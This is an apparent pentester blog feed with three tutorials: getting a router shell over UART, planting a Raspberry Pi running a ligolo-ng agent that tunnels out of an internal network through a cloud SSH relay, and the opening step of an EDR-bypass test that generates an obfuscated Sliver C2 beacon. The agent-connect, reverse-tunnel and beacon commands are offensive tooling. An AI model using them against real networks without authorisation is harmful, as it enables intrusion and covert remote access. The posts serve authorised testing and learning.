<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.3">Jekyll</generator><link href="/feed.xml" rel="self" type="application/atom+xml" /><link href="/" rel="alternate" type="text/html" /><updated>2024-07-10T22:03:55-04:00</updated><id>/feed.xml</id><title type="html">Cleck</title><subtitle>Pentester, CTF Player</subtitle><author><name>CLECK</name></author><entry><title type="html">UART Basics: Getting a shell via UART (Netgear WNR1000v3)</title><link href="/iot/IOTUart/" rel="alternate" type="text/html" title="UART Basics: Getting a shell via UART (Netgear WNR1000v3)" /><published>2024-07-09T00:00:00-04:00</published><updated>2024-07-09T00:00:00-04:00</updated><id>/iot/IOTUart</id><content type="html" xml:base="/iot/IOTUart/"><![CDATA[<p><img src="/assets/images/router.png#center" alt="" /></p>

<h2 id="overview">Overview</h2>

<p>Ever wonder what’s under the hood of many of your IoT devices? It’s probably some form of Linux! In this article, I will show you how to get a shell within a router using a Bus Pirate and a UART connection. For this demonstration, I will be using the Netgear WNR1000v3.</p>

<p><strong><em>Disclaimer - If done improperly, it is VERY easy to brick your device. Connecting over UART can also void your warranty.</em></strong></p>

<p><img src="/assets/images/netgearWNR1000v3.png" alt="" /></p>

<h2 id="getting-started">Getting Started</h2>

<p>To get started, you will need a way to communicate over UART. There are several ways of doing this, but I will be using the Bus Pirate from Dangerous Prototypes:</p>

<blockquote>
  <p>“The Bus Pirate is an open source hacker multi-tool that talks to electronic stuff. It’s got a bunch of features an intrepid hacker might need to prototype their next project” - http://dangerousprototypes.com/docs/Bus_Pirate</p>
</blockquote>

<p>You can pick one up from SparkFun for around $32: https://www.sparkfun.com/products/12942</p>

<h2 id="overview-of-the-board">Overview of the board</h2>
<p><img src="/assets/images/netgear/netgearWNR1000v3/1.png" alt="" /></p>

<h3 id="front">Front</h3>
<p>On the front of the board, we can see:</p>
<ul>
  <li>Broadcom BCM5356A1 CPU</li>
  <li>SDRAM</li>
  <li>6 Pin header for our UART Connection</li>
</ul>

<p><img src="/assets/images/netgear/netgearWNR1000v3/2.png" alt="" /></p>

<h3 id="back">Back</h3>
<p>On the back of the board we can see:</p>

<ul>
  <li>Macronix MX25L3205DM2I-12G (Flash Chip)</li>
</ul>

<h2 id="uart-connection">UART Connection</h2>
<p>UART has three components that allow it to communicate:</p>

<h3 id="tx-transmit">TX (Transmit)</h3>
<p>Is responsible for transmitting the data and is connected to the RX pin.</p>
<h3 id="rx-receive">RX (Receive)</h3>
<p>Is responsible for Receiving the data and is connected to the TX pin.</p>
<h3 id="gnd-ground">GND (Ground)</h3>
<p>Provides a common reference voltage level for both the transmitting and receiving devices.</p>

<p>Sometimes, we have to figure out where each of these pins are located within the header, but thankfully OPENWRT has done this for us:</p>
<blockquote>
  <p>“Attach 3,3V Serial UART Adapter to J3 on the PCB. Pin 6=GND, Pin 2=RXD, Pin 5=TXD. J3 Connector is not soldered in by default. Standard UART speed 115200 Baud. “ - https://openwrt.org/toh/netgear/wnr1000_v3</p>
</blockquote>

<p>We can see this below: 
<img src="/assets/images/netgear/netgearWNR1000v3/3.png" alt="" /></p>

<p>To connect our Bus Pirate, as mentioned earlier, we have to remember that the TX (Transmit) is connected to the RX (Receive), as shown below:</p>

<p><img src="/assets/images/TX_RX.png#center" alt="" /></p>

<p>To make these connections for your Bus Pirate, you can follow this diagram provided by <a href="https://learn.sparkfun.com/tutorials/bus-pirate-v36a-hookup-guide/all">Sparkfun</a>:</p>

<p><img src="/assets/images/PIN_HEADER.png" alt="" /></p>

<p>Once this is all connected it should look something like this:</p>

<p><img src="/assets/images/uartconnection.jpg" alt="" /></p>

<p>Now that we have all of our connections we can now jump over to linux.</p>

<p>To start our connection to our BusPirate, we will type:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo screen /dev/ttyUSB0 115200
</code></pre></div></div>

<p>You should be presented with the HiZ or (high impedence mode)</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HiZ&gt;
</code></pre></div></div>

<p>We can now now type ‘w’ to get the list of menu options:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HiZ&gt;m
1. HiZ
2. 1-WIRE
3. UART
4. I2C
5. SPI
6. 2WIRE
7. 3WIRE
8. LCD
9. DIO
x. exit(without change)
</code></pre></div></div>

<p>we are going to type ‘3’ for UART</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>(1)&gt;3
Set serial port speed: (bps)
1. 300
2. 1200
3. 2400
4. 4800
5. 9600
6. 19200
7. 38400
8. 57600
9. 115200
10. BRG raw value
</code></pre></div></div>

<p>We are going to choose ‘9’ for 115200 bps</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>(1)&gt;9
Data bits and parity:
1. 8, NONE *default
2. 8, EVEN
3. 8, ODD
4. 9, NONE
(1)&gt;
</code></pre></div></div>

<p>‘1’ for default</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>(1)&gt;1
Stop bits:
1. 1 *default
2. 2
(1)&gt;
</code></pre></div></div>

<p>‘1’ for default</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>(1)&gt;1
Receive polarity:
1. Idle 1 *default
2. Idle 0
(1)&gt;
</code></pre></div></div>

<p>‘1’ for default</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>(1)&gt;1
Select output type:
1. Open drain (H=Hi-Z, L=GND)
2. Normal (H=3.3V, L=GND)
</code></pre></div></div>

<p>‘2’ for normal</p>

<p>We should now be presented with the following:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>(1)&gt;2
Ready
UART&gt;
</code></pre></div></div>

<p>For the UART menu, you can type:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>UART&gt;(0)
0.Macro menu
1.Transparent bridge
2. Live monitor
3.Bridge with flow control
</code></pre></div></div>

<p>We are going to choose option 3 and select y for yes</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>UART&gt;(3)
UART bridge
Reset to exit
Are you sure? y
</code></pre></div></div>

<p>And…..</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>BusyBox v0.60.0 (2014.02.27-07:07+0000) Built-in shell (msh)
Enter 'help' for a list of built-in commands.

#
# ls
www
var
usr
tmp
sys
sbin
proc
mnt
media
lib
etc
dev
bin
</code></pre></div></div>

<p>We get a shell!</p>

<p>References:</p>
<ul>
  <li>https://techinfodepot.shoutwiki.com/wiki/Netgear_WNR1000v3</li>
  <li>https://openwrt.org/toh/netgear/wnr1000_v3</li>
  <li>https://learn.sparkfun.com/tutorials/bus-pirate-v36a-hookup-guide/all</li>
</ul>]]></content><author><name>CLECK</name></author><category term="IOT" /><category term="IOT" /><category term="IOT hacking" /><category term="Embeded Systems" /><summary type="html"><![CDATA[Ever wonder what’s under the hood of many of your IoT devices? It’s probably some form of Linux! In this article, I will show you how to get a shell within a router using a Bus Pirate and a UART connection. For this demonstration, I will be using the Netgear WNR1000v3.]]></summary></entry><entry><title type="html">EvilPI: Using a Raspberry Pi as an Agent into an Internal Network</title><link href="/pentesting/EvilPI/" rel="alternate" type="text/html" title="EvilPI: Using a Raspberry Pi as an Agent into an Internal Network" /><published>2024-06-24T00:00:00-04:00</published><updated>2024-06-24T00:00:00-04:00</updated><id>/pentesting/EvilPI</id><content type="html" xml:base="/pentesting/EvilPI/"><![CDATA[<p><img src="/assets/images/evilpi.png#center" alt="" /></p>

<h2 id="background">Background</h2>

<p>While doing some of the Pro-labs for HTB, I recently discovered <a href="https://github.com/Nicocha30/ligolo-ng">ligolo-ng</a>.</p>

<blockquote>
  <p><strong>Ligolo-ng</strong> is a <em>simple</em>, <em>lightweight</em>, and <em>fast</em> tool that allows pentesters to establish tunnels from a reverse TCP/TLS connection using a <strong>tun interface</strong> (without the need for SOCKS).</p>
</blockquote>

<p>The program is really cool and easy to use. It allows you to tunnel into the infected device similar to a VPN. This allows attackers to get around tools like ProxyChains and can help speed up tools like Nmap.</p>

<p>I thought it might be a neat little project to get a lightweight tool like this one running on a Raspberry Pi. We can then route through a cloud instance and use our at-home Kali machine.</p>

<p>This would be useful if you needed to put a machine on an internal network for pentesting.</p>

<h2 id="getting-started">Getting Started</h2>

<p>In this project, I will be using a <a href="https://www.raspberrypi.com/products/raspberry-pi-4-model-b/">Raspberry Pi 4</a> (4GB) running Debian and a Linode container.</p>

<p>Ligolo-ng is built using an agent and a proxy. For the Raspberry Pi, you will want to pick up a copy of the agent:
https://github.com/nicocha30/ligolo-ng/releases/tag/v0.6.1</p>

<h2 id="testing-on-pi">Testing on Pi</h2>

<p>I’m going to pick up a copy for my Pi by running:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.6.1/ligolo-ng_agent_0.6.1_linux_armv7.tar.gz
$ tar xf ./ligolo-ng_agent_0.6.1_linux_armv7.tar.gz
$ chmod +x agent
</code></pre></div></div>

<p>We now have to download the proxy with the following:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.6.1/ligolo-ng_proxy_0.6.1_linux_amd64.tar.gz
$ tar xf ./ligolo-ng_proxy_0.6.1_linux_amd64.tar.gz
</code></pre></div></div>

<p>To start my proxy server I will run:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ ./proxy -selfcert
</code></pre></div></div>

<p>To test my Pi’s connection back to my PC I will run:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ ./agent -connect 192.168.254.147:11601 -ignore-cert 
</code></pre></div></div>

<p>We can now see the connection made by the Pi:</p>

<p><img src="/assets/images/prxysession.png" alt="" /></p>

<h2 id="using-the-cloud">Using the Cloud</h2>

<p>Since our attacker machine will sit behind a firewall, we need a way to ensure that the agent can route to a cloud instance.</p>

<p><img src="/assets/images/SSH%20Tunnel.png" alt="" /></p>

<p>To make it easy and secure, we are going to route the Ligolo-ng through an SSH tunnel.</p>

<h3 id="raspberry-pi">Raspberry Pi:</h3>

<p>I created a script that will automatically create this service for you. You can find it at:
https://github.com/Cleck777/PI-Ligolo-ng-Service-Starter</p>

<p>The main component of this script is:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> $ autossh -M 20000 -N -T -L 11601:127.0.0.1:11601 {SSH_USER}@{HOSTNAME} -i {IDENTITY_FILE}
</code></pre></div></div>

<p>This will forward your local port (default: 11601) to the remote server.</p>

<p>You can now start the agent:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> $ /usr/bin/agent -connect localhost:11601 -ignore-cert
</code></pre></div></div>

<h3 id="attacker-machine">Attacker Machine</h3>

<p>First, you have to start a remote port forward to your local ligolo-ng proxy:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> $ ssh -R 11601:127.0.0.1:11601 {SSH_USER}@{HOSTNAME} -i {IDENTITY_FILE}
</code></pre></div></div>

<p>You can now start the proxy:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> $ ./proxy -selfcert
</code></pre></div></div>

<p><img src="/assets/images/Ligoloconnection.png" alt="" /></p>

<p>As we can see, we get a connection from our Raspberry Pi.</p>

<p>Type <code class="language-plaintext highlighter-rouge">session</code> and choose your session.</p>

<p>Now we need to create our interface:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> $ sudo ip tuntap add user [your_username] mode tun ligolo
 $ sudo ip link set ligolo up
</code></pre></div></div>

<p>We can now set up our route as normal:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ sudo ip route add 192.168.0.0/24 dev ligolo
</code></pre></div></div>

<p>You can now start your agent by typing:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> $ [Agent : root@raspberrypi] » start
</code></pre></div></div>

<p>And you’re good to go!</p>]]></content><author><name>CLECK</name></author><category term="pentesting" /><category term="pentesting" /><category term="ethical hacking" /><category term="tools" /><summary type="html"><![CDATA[Ever thought of using a Raspberry Pi as an agent for pentesting within an internal network? In this project, we explore how to set up a lightweight tool called Ligolo-ng on a Raspberry Pi. By routing through a cloud instance, you can leverage your at-home Kali machine for effective penetration testing. This guide walks you through the steps of setting up the agent and proxy, establishing secure SSH tunnels, and configuring your devices for seamless connectivity. Perfect for anyone looking to expand their pentesting toolkit with a cost-effective and portable solution.]]></summary></entry><entry><title type="html">Breaking into Windows: Attempting to bypass EDR with Sliver</title><link href="/pentesting/SlivervsWindows/" rel="alternate" type="text/html" title="Breaking into Windows: Attempting to bypass EDR with Sliver" /><published>2024-05-28T00:00:00-04:00</published><updated>2024-05-28T00:00:00-04:00</updated><id>/pentesting/SlivervsWindows</id><content type="html" xml:base="/pentesting/SlivervsWindows/"><![CDATA[<p><img src="/assets/images/BrokenWindows.png#center" alt="" /></p>

<h2 id="background">Background</h2>

<p>Sliver C2 is a pretty awesome alternative to metasploit developed by Bishop Fox:</p>

<blockquote>
  <p>Sliver is an open source cross-platform adversary emulation/red team framework, it can be used by organizations of all sizes to perform security testing. Sliver’s implants support C2 over Mutual TLS (mTLS), WireGuard, HTTP(S), and DNS and are dynamically compiled with per-binary asymmetric encryption keys.</p>
</blockquote>

<p>You can create both a beacon and an implant.
Im going to be using a beacon as it is alot stelthier:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ sliver &gt; generate beacon --http 192.168.56.1 --os windows --arch amd64 --format exe

[*] Generating new windows/amd64 beacon implant binary (1m0s)
[*] Symbol obfuscation is enabled
[*] Build completed in 16s
[*] Implant saved to /home/cleck/MODERN_MIDWIFE.exe
</code></pre></div></div>

<p>If we throw this into virus total we get:</p>]]></content><author><name>CLECK</name></author><category term="pentesting" /><category term="pentesting" /><category term="Bypass EDR" /><category term="tools" /><summary type="html"><![CDATA[How well does Microsoft Defender defend against a modified Sliver implant? I intend to answer that question by using common techniques used to bypass EDR to evaluate its detection and response capabilities under realistic attack scenarios.]]></summary></entry></feed>